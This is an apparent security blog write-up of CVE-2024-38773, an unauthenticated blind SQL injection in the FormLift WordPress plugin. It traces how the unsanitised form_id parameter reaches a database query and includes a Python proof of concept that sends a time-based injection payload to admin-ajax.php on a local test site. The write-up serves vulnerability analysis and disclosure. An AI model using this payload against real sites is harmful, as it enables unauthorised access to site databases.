---
layout: post
title:  "CVE-2024-38773 - Unauthenticated Blind SQL Injection Analysis"
date:   2025-10-30 21:44:56 +0700
categories: wordpress
---
# Info:

Type: Blind SQL Injection

Plugin Name: **FormLift for Infusionsoft Web Forms**

Version: < 7.5.18

**Base Score:** [**9.8 CRITICAL**](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2024-38773&vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1&source=NIST)

**Vector:**  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H


WPScan: [WPSCAN](https://wpscan.com/vulnerability/907f2dfb-90eb-4420-a845-b7260e64ea45/)

# PoC:
See instructions to set up WordPress and the plugin [here](https://t0t0r0o.github.io/writeups/wordpress/2025/10/29/setup.html).

In the function `formlift_submitV2` in `/wp-content/plugins/formlift/modules/form/submit.php`, the parameter `$formId` is taken directly from `$_POST['form_id']` without any input sanitization.

![image.png]({{ site.url }}/assets/images/CVE-2024-38773/image-1.png)

After the `$formId` variable is assigned, the function calls `do_action`, which triggers the **`formlift_before_submit`** hook. When `do_action()` runs, all functions registered to that hook will execute.

Examining the source code, the handler for **`formlift_before_submit`** is registered and invoked via `do_action( 'formlift_before_submit', $formId );`.

![image.png]({{ site.url }}/assets/images/CVE-2024-38773/image-2.png)

The **`formlift_before_submit`** function receives the `formID` parameter passed from `do_action(…)`. The `formId` variable is then used directly in a query function `formlift_get_form_impressions`.

![image.png]({{ site.url }}/assets/images/CVE-2024-38773/image-3.png)

PoC check

```python
import requests
from datetime import datetime, timezone
import time

url = "http://localhost:8080/wp-admin/admin-ajax.php"

data = {
    "action": "formlift_submit_form",
    "form_id": "1 OR IF(MID(@@version,1,1)=8,sleep(2),1)=2"  # check version 8
}

# Record start time (timezone-aware)
start_dt = datetime.now(timezone.utc)
start_ts = time.time()
print(f"Request start: {start_dt.isoformat()} (UTC)")

response = requests.post(url,  data=data)

# Record end time and compute duration
end_dt = datetime.now(timezone.utc)
end_ts = time.time()
duration_ms = (end_ts - start_ts) * 1000
print(f"Request end:   {end_dt.isoformat()} (UTC)")
print(f"Duration: {duration_ms:.2f} ms | Status: {response.status_code}")

print("--- response body ---")
print(response.text)
```

![image.png]({{ site.url }}/assets/images/CVE-2024-38773/image-4.png)
